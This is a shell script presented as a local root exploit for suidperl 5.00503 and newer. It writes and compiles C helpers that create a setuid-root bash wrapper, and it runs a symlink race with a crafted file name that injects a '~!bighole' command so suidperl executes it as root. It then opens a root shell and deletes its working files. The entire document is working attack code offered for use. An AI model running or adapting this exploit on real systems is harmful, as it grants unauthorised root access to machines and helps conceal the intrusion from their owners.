
clear

echo "Suidperl 5.00503 (and newer) root exploit"
echo "-----------------------------------------"
echo "Written by Michal Zalewski <lcamtuf@dione.ids.pl>"
echo "With great respect to Sebastian Krahmer..."
echo

SUIDPERL=/usr/bin/suidperl
SUIDBIN=/usr/bin/passwd

echo "[*] Using suidperl=$SUIDPERL, suidbin=$SUIDBIN..."

if [ ! -u $SUIDPERL ]; then
  echo "[-] Sorry, $SUIDPERL4 is NOT setuid on this system or"
  echo "    does not exist at all. If there's +s perl binary available,"
  echo "    please change SUIDPERL variable within exploit code."
  echo
  exit 0
fi


if [ ! -u $SUIDBIN ]; then
  echo "[-] Sorry, $SUIDBIN is NOT setuid on this system or does not exist at"
  echo "    all. Please pick any other +s binary and change SUIDBIN variable"
  echo "    within exploit code."
  echo
  exit 0
fi

echo "[+] Checks passed, compiling flares and helper applications..."
echo

cat >flare <<__eof__
#!/usr/bin/suidperl

print "Nothing can stop me now...\n";

__eof__

cat >bighole.c <<__eof__
main() {
  setuid(0);
  setgid(0);
  chown("sush",0,0);
  chmod("sush",04755);
}
__eof__

cat >sush.c <<__eof__
main() {
  setuid(0);
  setgid(0);
  system("/bin/bash");
}
__eof__

make bighole sush

echo

if [ ! -x ./sush ]; then
  echo "[-] Oops, seems to me I cannot compile helper applications. Either"
  echo "    you don't have working 'make' or 'gcc' utility. If possible,"
  echo "    please compile bighole.c and sush.c manually (to bighole and sush)."
  echo 
  exit 0
fi

echo "[+] Setting up environment..."

chmod 4755 ./flare

FILENAME='none

~!bighole

'
export interactive=1
PATH=.:$PATH

echo "[+] Starting exploit. It could take up to 5 minutes in order to get"
echo "[+] working root shell. WARNING - WARNING - WARNING: it could cause"
echo "[+] heavy system load."

while :; do
  ( ln -f -s $SUIDBIN "$FILENAME";usleep $RANDOM; nice -n +20 $SUIDPERL ./"$FILENAME" <./flare & ) &>/dev/null &
  ( usleep $RANDOM ; ln -f -s /dev/stdin "$FILENAME" ) &>/dev/null &
  if [ -u ./sush ]; then
    echo
    echo "[+] VOILA, BABE :-) Entering rootshell..."
    echo
    rm -f "$FILENAME" sush.c bighole bighole.c flare
    ./sush
    echo
    echo "[+] Thank you for using Marchew Industries / dupa.ryba products."
    echo
    rm -f "$FILENAME" sush.c bighole bighole.c flare sush
    exit 0
  fi
done
